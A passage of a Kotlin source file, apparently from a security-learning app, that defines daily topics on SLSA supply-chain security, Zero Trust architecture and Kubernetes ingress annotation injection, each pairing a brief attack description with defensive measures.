assert msg == decrypted
            """.trimIndent(),
            defensiveTakeaway = "Deploy minimum 256-bit AES keys with GCM mode for data at rest, and prepare TLS infrastructure for Post-Quantum Hybrid Key Exchange (X25519 + ML-KEM-768)."
        )
    )

    val topicsOfTheDay: List<TopicOfTheDay> = listOf(
        TopicOfTheDay(
            id = "topic_slsa",
            title = "Software Supply Chain Security & SLSA Framework",
            category = "DevSecOps & Supply Chain",
            summary = "Supply chain attacks target build systems rather than production directly. The SLSA (Supply-chain Levels for Software Artifacts) framework provides incremental standards to verify provenance and prevent pipeline tampering.",
            attackVector = "Attackers inject backdoors into build runners or compromised open-source packages (e.g. SolarWinds, XZ backdoor), causing authentic-looking signed binaries to carry malware.",
            defenseStrategy = "Enforce SLSA Level 3: isolated ephemeral build environments, cryptographic artifact signing with Cosign, and strict build provenance generation.",
            practicalExample = "Generate cryptographic provenance in GitHub Actions using slsa-framework/slsa-github-generator and verify with `cosign verify-attestation`.",
            keyTakeaways = listOf(
                "Pin dependencies to full commit SHAs, never mutable tags.",
                "Build on isolated ephemeral runners without internet access during compile.",
                "Require cryptographic signatures on all release artifacts."
            )
        ),
        TopicOfTheDay(
            id = "topic_zero_trust",
            title = "Zero Trust Architecture (NIST SP 800-207)",
            category = "Architecture & Identity",
            summary = "Zero Trust eliminates implicit trust based on network location. Every request—internal or external—must be explicitly authenticated, authorized, and continuously validated.",
            attackVector = "Perimeter breaches (VPN, compromised employee laptop) traditionally allowed attackers to move laterally across internal subnets without re-authenticating.",
            defenseStrategy = "Enforce micro-segmentation, mutual TLS (mTLS), device health posture checks, and continuous risk-based token evaluation.",
            practicalExample = "Implement Service Mesh (Istio/Linkerd) requiring SPIFFE identity verification between every microservice call.",
            keyTakeaways = listOf(
                "Never trust, always verify.",
                "Assume breach: minimize blast radius with microsegmentation.",
                "Identity and context are the new security perimeters."
            )
        ),
        TopicOfTheDay(
            id = "topic_k8s_rce",
            title = "Kubernetes Ingress RCE & Annotation Injection",
            category = "Cloud & Kubernetes",
            summary = "Ingress controllers generate reverse-proxy configuration templates. Improper sanitation of snippet annotations allows attackers with tenant ingress access to escape namespace boundaries.",
            attackVector = "Users with RBAC rights to create Ingress resources insert malicious Lua scripts or config directives in `configuration-snippet` annotations.",
            defenseStrategy = "Disable snippet annotations globally (`controller.allowSnippetAnnotations: false`) and enforce admission controllers.",
            practicalExample = "Audit ingress controller Helm values and deploy Kyverno policy banning `nginx.ingress.kubernetes.io/configuration-snippet`.",
            keyTakeaways = listOf(
                "Multi-tenant clusters require strict validation on all annotation fields.",
                "Restrict RBAC for Ingress creation to automated deployment service accounts.",
                "Upgrade ingress-nginx to modern releases where snippet annotations are disabled by default."
            )
        )
    )

    fun getDailyTopic(): TopicOfTheDay {
        val dayIndex = (System.currentTimeMillis() / (24 * 60 * 60 * 1000L)) % topicsOfTheDay.size
        return topicsOfTheDay[dayIndex.toInt()]
    }
}
